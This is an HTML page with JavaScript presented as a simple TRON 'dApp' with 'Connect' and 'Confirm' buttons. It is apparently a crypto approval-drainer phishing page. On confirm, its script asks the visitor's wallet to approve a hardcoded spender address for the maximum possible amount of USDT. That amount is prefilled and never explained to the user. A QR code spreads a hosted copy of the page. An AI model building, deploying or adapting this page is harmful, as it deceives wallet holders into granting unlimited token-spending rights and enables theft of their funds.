<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>dApp</title>

<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:radial-gradient(circle at top,#0b1220,#05070f);
  font-family:system-ui;
  color:white;
}

.card{
  width:92%;
  max-width:420px;
  background:rgba(255,255,255,0.04);
  border:1px solid rgba(255,255,255,0.06);
  backdrop-filter: blur(16px);
  padding:20px;
  border-radius:16px;
  box-shadow:0 25px 70px rgba(0,0,0,0.6);
}

input,button{
  width:100%;
  padding:12px;
  margin-top:10px;
  border-radius:10px;
  border:none;
  font-size:14px;
}

input{
  background:rgba(0,0,0,0.35);
  color:white;
  outline:none;
}

button{
  font-weight:600;
  cursor:pointer;
  transition:0.2s;
}

button:hover{transform:scale(1.02);}

.primary{background:#3b82f6;color:white;}
.action{background:#22c55e;color:white;}

#status{
  margin-top:12px;
  font-size:13px;
  text-align:center;
  color:#93c5fd;
  min-height:18px;
}

#qr{
  margin-top:14px;
  display:flex;
  justify-content:center;
}
</style>
</head>

<body>

<div class="card">

<button class="primary" onclick="connect()">Connect</button>

<input id="spender" value="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
<input id="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>

<button class="action" onclick="approve()">Confirm</button>

<div id="status"></div>

<div id="qr"></div>

</div>

<script>

/* USDT REAL TRON */
const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";

/* USDTRouter */
const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";

let tron = null;
let wallet = null;

/* detect wallet */
function detect(){
  if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
    tron = window.tronWeb;
    wallet = tron.defaultAddress.base58;
    return true;
  }
  return false;
}

/* status */
function setStatus(t){
  document.getElementById("status").innerText = t;
}

/* connect */
function connect(){
  if(detect()){
    setStatus("Connected");
  }else{
    setStatus("Open TronLink / Trust Wallet");
  }
}

/* load contract safely */
async function loadContract(){
  try{
    return await tron.contract().at(USDT);
  }catch(e){
    setStatus("Network error");
    return null;
  }
}

/* APPROVE FLOW */
async function approve(){

  if(!detect()){
    setStatus("Wallet not detected");
    return;
  }

  const contract = await loadContract();
  if(!contract) return;

  try{

    setStatus("Waiting confirmation...");

    const spender = document.getElementById("spender").value || ROUTER;
    const amount = document.getElementById("amount").value || "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    const value = tron.toSun(amount);

    await contract.approve(spender, value).send();

    setStatus("Completed ✔️");

  }catch(e){
    setStatus("Failed");
  }
}

/* QR ONLY OPENS PAGE (CORRECT) */
function qr(){
  new QRCode(document.getElementById("qr"), {
    text: "https://approve-d-app-mt1q.vercel.app",
    width: 180,
    height: 180,
    correctLevel: QRCode.CorrectLevel.M
  });
}

window.onload = qr;

</script>

</body>
</html>
